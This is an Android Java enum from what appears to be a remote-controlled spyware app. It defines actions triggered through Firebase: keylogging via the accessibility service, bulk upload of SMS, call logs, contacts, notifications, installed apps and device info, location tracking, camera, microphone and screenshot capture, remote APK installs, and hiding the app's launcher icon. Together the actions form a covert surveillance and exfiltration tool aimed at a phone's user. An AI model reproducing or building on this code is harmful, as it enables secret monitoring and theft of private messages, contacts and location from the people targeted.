package com.vikasyadavnsit.cdc.enums;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.services.CDCSensorService;
import com.vikasyadavnsit.cdc.utils.ActionUtils;
import com.vikasyadavnsit.cdc.utils.AppUtils;
import com.vikasyadavnsit.cdc.utils.CallUtils;
import com.vikasyadavnsit.cdc.utils.FileUtils;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.AppUpdateUtils;
import com.vikasyadavnsit.cdc.utils.LocationUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;
import com.vikasyadavnsit.cdc.utils.MessageUtils;

import java.util.List;
import java.util.Map;
import java.util.function.BiConsumer;

import lombok.AllArgsConstructor;
import lombok.Getter;

@Getter
@AllArgsConstructor
public enum ClickActions {

    REQUEST_ALL_PERMISSION(
            1, ClickActionCategory.SECURITY, TriggerType.PERMISSION,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestAllPermissions((Activity) context);
            },
            "Request all permissions in a single stroke",
            "Request all permissions",
            null
    ),
    REQUEST_EXACT_ALARM_PERMISSION(
            2, ClickActionCategory.SYSTEM, TriggerType.PERMISSION,
            (context, triggerSettingsData) -> {
                ActionUtils.requestExactAlarmPermission();
            },
            "Request exact alarm permission for precision timing",
            "Request alarm permission",
            PermissionType.SCHEDULE_EXACT_ALARM
    ),
    REQUEST_ACCESSIBILITY_PERMISSION(
            3, ClickActionCategory.SECURITY, TriggerType.PERMISSION,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.ACCESSIBILITY_SERVICE)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.ACCESSIBILITY_SERVICE);
                    // One-shot: Reset enabled status to avoid looping settings screen
                    triggerSettingsData.setEnabled(false);
                    FirebaseUtils.updateRemoteTrigger("REQUEST_ACCESSIBILITY_PERMISSION", triggerSettingsData);
                }
            },
            "Request accessibility permission for key logging",
            "Request accessibility permission",
            PermissionType.ACCESSIBILITY_SERVICE
    ),
    REQUEST_SMS_PERMISSION(
            4, ClickActionCategory.SMS, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.READ_SMS)) {
                    pm.requestPermission((Activity) context, PermissionType.READ_SMS);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.READ_SMS));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_SMS_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    if (data.getActionStatus() == ActionStatus.START) {
                        new Thread(() -> {
                            // Clear existing cloud data for this type
                            FirebaseUtils.getDbRef(FirebaseUtils.getPath("/userDeviceData/sms")).removeValue();
                            FirebaseUtils.getDbRef(FirebaseUtils.getPath("/userDeviceData/metadata/sms")).removeValue();
                            FirebaseUtils.uploadUserSmsDataSnapshot(MessageUtils.getMessages(context, FileMap.SMS));
                            data.setActionStatus(ActionStatus.IDLE);
                            FirebaseUtils.updateRemoteTrigger("REQUEST_SMS_PERMISSION", data);
                        }).start();
                    } else {
                        // CDCCaptureService will handle REAL_TIME and SCHEDULED
                        com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                    }
                }
            },
            "Manage SMS access and background capture configuration",
            "SMS Access & Capture",
            PermissionType.READ_SMS
    ),
    REQUEST_FILE_ACCESS_PERMISSION(
            5, ClickActionCategory.STORAGE, TriggerType.PERMISSION,
            (context, data) -> {
                com.vikasyadavnsit.cdc.permissions.PermissionManager pm = new com.vikasyadavnsit.cdc.permissions.PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.MANAGE_EXTERNAL_STORAGE)) {
                    pm.requestPermission((Activity) context, PermissionType.MANAGE_EXTERNAL_STORAGE);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.MANAGE_EXTERNAL_STORAGE));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_FILE_ACCESS_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    if (data.getActionStatus() == ActionStatus.START) {
                        ActionUtils.getDirectoryStructure((Activity) context);
                        data.setActionStatus(ActionStatus.IDLE);
                        FirebaseUtils.updateRemoteTrigger("REQUEST_FILE_ACCESS_PERMISSION", data);
                    } else {
                        com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                    }
                }
            },
            "Manage file access and automated directory structure synchronization",
            "File Access & Exploration",
            PermissionType.MANAGE_EXTERNAL_STORAGE
    ),
    REQUEST_NOTIFICATION_ACCESS(
            6, ClickActionCategory.NOTIFICATIONS, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                boolean listenerGranted = pm.hasPermission(context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE);
                boolean postGranted = pm.hasPermission(context, PermissionType.POST_NOTIFICATIONS);

                if (data.getActionStatus() == ActionStatus.PREPARE || !listenerGranted || !postGranted) {
                    if (!listenerGranted) {
                        pm.requestPermission((Activity) context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE);
                    } else if (!postGranted) {
                        pm.requestPermission((Activity) context, PermissionType.POST_NOTIFICATIONS);
                    }
                    
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE) 
                            && pm.hasPermission(context, PermissionType.POST_NOTIFICATIONS));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_NOTIFICATION_ACCESS", data);
                } else if (data.isCaptureEnabled()) {
                    com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                }
            },
            "Manage notification listener access, background sync and remote alerts",
            "Notifications Access & Alerts",
            PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE
    ),
    MANAGE_USAGE_AND_APPS(
            7, ClickActionCategory.APPS, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.PACKAGE_USAGE_STATS)) {
                    pm.requestPermission((Activity) context, PermissionType.PACKAGE_USAGE_STATS);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.PACKAGE_USAGE_STATS));
                    FirebaseUtils.updateRemoteTrigger("MANAGE_USAGE_AND_APPS", data);
                } else if (data.isCaptureEnabled()) {
                    if (data.getActionStatus() == ActionStatus.START) {
                        new Thread(() -> {
                            com.vikasyadavnsit.cdc.services.AppUsageStats.getDailyUsageStats(context, true);
                            java.util.List<java.util.Map<String, String>> apps = AppUtils.getInstalledApps(context);
                            FirebaseUtils.uploadInstalledAppsSnapshot(apps);
                            ActionUtils.registerScreenStateMonitor(context);
                            data.setActionStatus(ActionStatus.IDLE);
                            FirebaseUtils.updateRemoteTrigger("MANAGE_USAGE_AND_APPS", data);
                        }).start();
                    } else {
                        com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                    }
                }
            },
            "Manage app usage analytics, installed apps metadata, and screen state events",
            "Usage & App Monitoring",
            PermissionType.PACKAGE_USAGE_STATS
    ),
    REQUEST_BATTERY_OPTIMIZATION(
            8, ClickActionCategory.SYSTEM, TriggerType.PERMISSION,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.BATTERY_OPTIMIZATION)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.BATTERY_OPTIMIZATION);
                    triggerSettingsData.setEnabled(false);
                    FirebaseUtils.updateRemoteTrigger("REQUEST_BATTERY_OPTIMIZATION", triggerSettingsData);
                }
            },
            "Request to ignore battery optimizations",
            "Request battery optimization",
            PermissionType.BATTERY_OPTIMIZATION
    ),
    START_SENSOR_SERVICE(
            9, ClickActionCategory.DIAGNOSTICS, TriggerType.SERVICE,
            (context, triggerSettingsData) -> {
                if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    CDCSensorService.startSensorService((Activity) context);
                } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                    CDCSensorService.stopSensorService((Activity) context);
                }
            },
            "Start/Stop sensor service for real-time data",
            "Start sensor service",
            PermissionType.BODY_SENSORS
    ),
    CAPTURE_ALL_CONTACTS(
            11, ClickActionCategory.CONTACTS, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Legacy - logic moved to REQUEST_CONTACTS_PERMISSION
            },
            "Capture all phone contacts snapshot (Legacy)",
            "Capture contacts",
            PermissionType.READ_CONTACTS
    ),
    MONITOR_CALL_STATE(
            131, ClickActionCategory.CALLS, TriggerType.SERVICE,
            (context, triggerSettingsData) -> {
                CallUtils.monitorCallState(context);
            },
            "Monitor live phone call state transitions (ringing, off-hook, idle)",
            "Monitor call state",
            PermissionType.READ_PHONE_STATE
    ),
    CAPTURE_ALL_SMS(
            12, ClickActionCategory.SMS, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Legacy - logic moved to REQUEST_SMS_PERMISSION
            },
            "Capture all SMS history (Legacy)",
            "Capture SMS",
            PermissionType.READ_SMS
    ),
    CAPTURE_ALL_CALL_LOGS(
            13, ClickActionCategory.CALLS, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Legacy - logic moved to REQUEST_CALL_LOG_PERMISSION
            },
            "Capture complete call history (Legacy)",
            "Capture call",
            PermissionType.READ_CALL_LOG
    ),
    REQUEST_CALL_LOG_PERMISSION(
            130, ClickActionCategory.CALLS, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.READ_CALL_LOG)) {
                    pm.requestPermission((Activity) context, PermissionType.READ_CALL_LOG);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.READ_CALL_LOG));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_CALL_LOG_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    if (data.getActionStatus() == ActionStatus.START) {
                        new Thread(() -> {
                            FirebaseUtils.getDbRef(FirebaseUtils.getPath("/userDeviceData/callLogs")).removeValue();
                            FirebaseUtils.getDbRef(FirebaseUtils.getPath("/userDeviceData/metadata/callLogs")).removeValue();
                            FirebaseUtils.uploadUserCallLogsDataSnapshot(MessageUtils.getMessages(context, FileMap.CALL));
                            data.setActionStatus(ActionStatus.IDLE);
                            FirebaseUtils.updateRemoteTrigger("REQUEST_CALL_LOG_PERMISSION", data);
                        }).start();
                    } else {
                        com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                    }
                }
            },
            "Manage Call Log access and background capture configuration",
            "Calls Access & Capture",
            PermissionType.READ_CALL_LOG
    ),
    REQUEST_CONTACTS_PERMISSION(
            110, ClickActionCategory.CONTACTS, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.READ_CONTACTS)) {
                    pm.requestPermission((Activity) context, PermissionType.READ_CONTACTS);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.READ_CONTACTS));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_CONTACTS_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    if (data.getActionStatus() == ActionStatus.START) {
                        new Thread(() -> {
                            FirebaseUtils.getDbRef(FirebaseUtils.getPath("/userDeviceData/contacts")).removeValue();
                            FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages(context, FileMap.CONTACTS));
                            data.setActionStatus(ActionStatus.IDLE);
                            FirebaseUtils.updateRemoteTrigger("REQUEST_CONTACTS_PERMISSION", data);
                        }).start();
                    } else {
                        com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                    }
                }
            },
            "Manage Contacts access and background capture configuration",
            "Contacts Access & Capture",
            PermissionType.READ_CONTACTS
    ),
    CAPTURE_KEY_STROKES(
            14, ClickActionCategory.SECURITY, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Handled by Accessibility service
            },
            "Capture key strokes via accessibility",
            "Capture key strokes",
            PermissionType.ACCESSIBILITY_SERVICE
    ),
    CAPTURE_NOTIFICATIONS(
            15, ClickActionCategory.NOTIFICATIONS, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Handled by Notification listener
            },
            "Capture device notifications",
            "Capture Notification",
            PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE
    ),
    GET_APP_USAGE_STATISTICS_REPORT(
            16, ClickActionCategory.APPS, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Legacy - logic moved to MANAGE_USAGE_AND_APPS
            },
            "Generate app usage analytics report (Legacy)",
            "Get app usage report",
            PermissionType.PACKAGE_USAGE_STATS
    ),
    MONITOR_PHONE_STATISTICS(
            18, ClickActionCategory.DIAGNOSTICS, TriggerType.SERVICE,
            (context, triggerSettingsData) -> {
                ActionUtils.registerPhoneStatistics((Activity) context);
            },
            "Monitor system events and statistics",
            "Monitor phone statistics",
            null
    ),
    GET_DIRECTORY_STRUCTURE(
            19, ClickActionCategory.STORAGE, TriggerType.SYSTEM,
            (context, triggerSettingsData) -> {
                // Handled via REQUEST_FILE_ACCESS_PERMISSION or Admin UI
                LoggerUtils.d("ClickActions", "Manual scan via trigger map is disabled. Use File Access config.");
            },
            "Explore device folder hierarchy (Disabled in Grid)",
            "Get directory structure",
            PermissionType.MANAGE_EXTERNAL_STORAGE
    ),
    RESET_ALL_PERMISSION(
            20, ClickActionCategory.SYSTEM, TriggerType.SYSTEM,
            (context, triggerSettingsData) -> {
                new com.vikasyadavnsit.cdc.permissions.PermissionManager().resetAllPermissionManually(context);
            },
            "Revoke all permissions and wipe all local and Firebase data (Factory Reset)",
            "Full Factory Reset",
            null
    ),
    TRACK_LIVE_LOCATION(
            21, ClickActionCategory.LOCATION, TriggerType.SERVICE,
            (context, triggerSettingsData) -> {
                if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    LocationUtils.captureAndUpload(context);
                }
            },
            "Capture and upload current GPS location to Firebase (Legacy)",
            "Track live location",
            PermissionType.LOCATION
    ),
    REQUEST_LOCATION_PERMISSION(
            22, ClickActionCategory.LOCATION, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.LOCATION)) {
                    pm.requestPermission((Activity) context, PermissionType.LOCATION);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.LOCATION));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_LOCATION_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    // CDCCaptureService will handle background tracking based on interval
                    com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                }
            },
            "Manage Location access and real-time tracking configuration",
            "Location Access & Tracking",
            PermissionType.LOCATION
    ),
    UPDATE_APP(
            23, ClickActionCategory.SYSTEM, TriggerType.SYSTEM,
            (context, triggerSettingsData) -> AppUpdateUtils.checkForUpdate(context),
            "Download and install the latest APK from Firebase Storage (cdc/updates path)",
            "Update app",
            null
    ),
    WIPE_CLOUD_DATA(
            24, ClickActionCategory.SYSTEM, TriggerType.SYSTEM,
            (context, triggerSettingsData) -> FirebaseUtils.wipeCloudData(),
            "Wipe all captured device data (SMS, Contacts, Logs, Location, etc.) from Firebase",
            "Wipe Cloud Data",
            null
    ),
    REQUEST_VPN_PERMISSION(
            26, ClickActionCategory.CONNECTIVITY, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.VPN)) {
                    pm.requestPermission((Activity) context, PermissionType.VPN);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.VPN));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_VPN_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    // VPN background sync enabled -> start service if needed
                    ActionUtils.startVpnService((Activity) context);
                } else {
                    // Disabled -> stop service
                    ActionUtils.stopVpnService(context);
                }
            },
            "Manage VPN authorization and background network monitoring configuration",
            "VPN Access & Control",
            PermissionType.VPN
    ),
    REQUEST_SCREENSHOT_PERMISSION(
            27, ClickActionCategory.SCREEN, TriggerType.PERMISSION,
            (context, triggerSettingsData) -> {
                com.vikasyadavnsit.cdc.services.ScreenshotService.setRemoteMode(true);
                ActionUtils.startMediaProjectionService((Activity) context);
            },
            "Request Screen Capture authorization from the user to enable remote screenshots",
            "Request Screenshot permission",
            PermissionType.FOREGROUND_SERVICE_MEDIA_PROJECTION
    ),
    REQUEST_POST_NOTIFICATION_PERMISSION(
            28, ClickActionCategory.NOTIFICATIONS, TriggerType.PERMISSION,
            (context, triggerSettingsData) -> {
                new com.vikasyadavnsit.cdc.permissions.PermissionManager().requestPermission((Activity) context, PermissionType.POST_NOTIFICATIONS);
            },
            "Request permission to show notifications on this device",
            "Request Notify permission",
            PermissionType.POST_NOTIFICATIONS
    ),
    REQUEST_CAMERA_PERMISSION(
            30, ClickActionCategory.CAMERA, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.CAMERA)) {
                    pm.requestPermission((Activity) context, PermissionType.CAMERA);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.CAMERA));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_CAMERA_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    // Logic to handle background photo sync or starting the camera service 
                    // based on data.getCaptureMode() and extraConfig
                    com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                }
            },
            "Manage camera access and automated background photo capture settings",
            "Camera Access & Capture",
            PermissionType.CAMERA
    ),
    TRIGGER_CAMERA_CAPTURE(
            31, ClickActionCategory.CAMERA, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // One-shot camera capture is now handled via the /commands/ node 
                // in AdminCameraFragment to prevent accidental background triggers.
                LoggerUtils.d("ClickActions", "Camera capture via trigger map is disabled. Use Remote Camera panel.");
            },
            "Trigger an immediate photo capture from front/back cameras (Disabled in Grid)",
            "Trigger Camera",
            PermissionType.CAMERA
    ),
    TOGGLE_LIVE_CAMERA_FEED(
            32, ClickActionCategory.CAMERA, TriggerType.SERVICE,
            (context, triggerSettingsData) -> {
                // Live feed is now handled via the /commands/ node 
                // in AdminCameraFragment to prevent accidental background triggers.
                LoggerUtils.d("ClickActions", "Live feed via trigger map is disabled. Use Remote Camera panel.");
            },
            "Start/Stop high-speed frame uploads for a live camera feed (Disabled in Grid)",
            "Live Camera Feed",
            PermissionType.CAMERA
    ),
    REQUEST_MIC_PERMISSION(
            33, ClickActionCategory.MICROPHONE, TriggerType.PERMISSION,
            (context, data) -> {
                PermissionManager pm = new PermissionManager();
                if (data.getActionStatus() == ActionStatus.PREPARE || !pm.hasPermission(context, PermissionType.RECORD_AUDIO)) {
                    pm.requestPermission((Activity) context, PermissionType.RECORD_AUDIO);
                    data.setActionStatus(ActionStatus.IDLE);
                    data.setPermissionGranted(pm.hasPermission(context, PermissionType.RECORD_AUDIO));
                    FirebaseUtils.updateRemoteTrigger("REQUEST_MIC_PERMISSION", data);
                } else if (data.isCaptureEnabled()) {
                    com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(context);
                }
            },
            "Manage microphone access and automated background recording settings",
            "Mic Access & Recording",
            PermissionType.RECORD_AUDIO
    ),
    TRIGGER_MIC_RECORDING(
            34, ClickActionCategory.MICROPHONE, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Mic recording is now handled via the /commands/ node 
                // in AdminMicFragment or via REQUEST_MIC_PERMISSION background sync.
                LoggerUtils.d("ClickActions", "Mic recording via trigger map is disabled. Use Remote Mic panel.");
            },
            "Trigger an immediate microphone recording (Disabled in Grid)",
            "Trigger Mic",
            PermissionType.RECORD_AUDIO
    ),
    CAPTURE_INSTALLED_APPS(
            29, ClickActionCategory.APPS, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                // Legacy - logic moved to MANAGE_USAGE_AND_APPS
            },
            "Capture list of all installed applications with metadata (Legacy)",
            "Capture installed apps",
            null
    ),
    MONITOR_SCREEN_STATE(
            17, ClickActionCategory.APPS, TriggerType.SERVICE,
            (context, triggerSettingsData) -> {
                // Legacy - logic moved to MANAGE_USAGE_AND_APPS
            },
            "Register listener for screen on/off and unlock events (Legacy)",
            "Monitor screen state",
            null
    ),
    CAPTURE_DEVICE_INFO(
            36, ClickActionCategory.DIAGNOSTICS, TriggerType.DATA_CAPTURE,
            (context, triggerSettingsData) -> new Thread(() ->
                    FirebaseUtils.uploadDeviceInfo(
                            com.vikasyadavnsit.cdc.utils.DeviceInfoUtils.collectAll(context))
            ).start(),
            "Capture full device info: WiFi, Bluetooth, network, storage, system",
            "Capture device info",
            null
    ),
    TOGGLE_APP_VISIBILITY(
            39, ClickActionCategory.SYSTEM, TriggerType.SERVICE,
            (context, triggerSettingsData) -> {
                try {
                    android.content.pm.PackageManager pm = context.getPackageManager();
                    android.content.ComponentName componentName = new android.content.ComponentName(context, "com.vikasyadavnsit.cdc.activities.MainActivity");
                    int current = pm.getComponentEnabledSetting(componentName);
                    int newState = (current == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED)
                            ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                            : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
                    pm.setComponentEnabledSetting(componentName, newState, android.content.pm.PackageManager.DONT_KILL_APP);
                } catch (Exception e) {
                    com.vikasyadavnsit.cdc.utils.LoggerUtils.e("ClickActions", "Toggle visibility failed: " + e.getMessage());
                }
            },
            "Toggle app icon visibility on the launcher",
            "Toggle App Visibility",
            null
    ),
    PUSH_REMOTE_LOGS(
            41, ClickActionCategory.DIAGNOSTICS, TriggerType.DIAGNOSTICS,
            (context, triggerSettingsData) -> {
                // Handled in LoggerUtils via live config check
            },
            "Push client logs to Firebase for remote debugging and monitoring",
            "Remote Logging",
            null
    );

    final int order;
    final ClickActionCategory category;
    final TriggerType triggerType;
    final BiConsumer<Context, User.AppTriggerSettingsData> biConsumer;
    final String description;
    final String actionLabel;
    final PermissionType requiredPermission;

    public void execute(Context context, User.AppTriggerSettingsData data) {
        if (data == null || !data.isEnabled()) {
            LoggerUtils.d("ClickActions", "Action " + this.name() + " is globally disabled, ignoring.");
            return;
        }
        PermissionManager pm = new PermissionManager();
        if (ActionStatus.PREPARE.equals(data.getActionStatus())) {
            if (requiredPermission != null && context instanceof Activity) {
                pm.requestPermission((Activity) context, requiredPermission);
                data.setActionStatus(ActionStatus.IDLE);
                data.setPermissionGranted(pm.hasPermission(context, requiredPermission));
                FirebaseUtils.updateRemoteTrigger(this.name(), data);
            }
            return;
        }

        if (triggerType != TriggerType.PERMISSION && requiredPermission != null && !pm.hasPermission(context, requiredPermission)) {
            LoggerUtils.w("ClickActions", "Permission " + requiredPermission + " not granted for " + this.name());
            return;
        }

        if (biConsumer != null && context != null) {
            biConsumer.accept(context, data);
        }
    }
}
